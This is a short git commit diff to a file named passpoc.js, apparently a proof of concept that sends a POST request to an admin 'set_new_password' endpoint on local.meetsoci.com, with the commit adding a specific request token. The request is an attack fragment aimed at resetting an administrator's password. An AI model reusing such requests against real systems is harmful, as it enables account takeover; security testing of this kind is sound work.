70fb32abd69cd7bbe6878fe190f3e4944fcd00ef
Andre Mesquita Pereira <apereira@meetsoci.com>
2025-09-29 14:47:47 -0300

    Update passpoc.js

--- passpoc.js
+++ passpoc.js
@@ -1,4 +1,4 @@
-fetch("https://local.meetsoci.com/api/admin/0/set_new_password?request_token=", {
+fetch("https://local.meetsoci.com/api/admin/0/set_new_password?request_token=dnJZPBT44VTOkroRSjhp", {
   method: "POST",
   headers: {
     "Content-Type": "application/x-www-form-urlencoded"
